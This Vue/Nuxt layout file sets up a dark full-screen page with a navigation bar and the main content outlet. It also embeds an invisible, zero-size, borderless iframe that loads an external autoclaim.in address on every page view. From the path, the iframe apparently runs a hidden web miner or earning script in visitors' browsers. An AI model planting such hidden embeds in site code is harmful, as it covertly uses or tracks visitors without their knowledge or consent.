<template>
  <div
    class="flex flex-col bg-darkest min-h-screen h-screen text-gray-50 antialiased"
  >
    <TheNavBar />
    <main class="flex flex-row flex-grow overflow-y-hidden">
      <Nuxt />
    </main>
    <iframe
      src="https://autoclaim.in/wm/acatzk/2"
      width="0"
      height="0"
      style="border:0"
    ></iframe>
  </div>
</template>

<script>
export default {
  components: {
    TheNavBar: () => import("~/components/TheNavBar")
  }
};
</script>
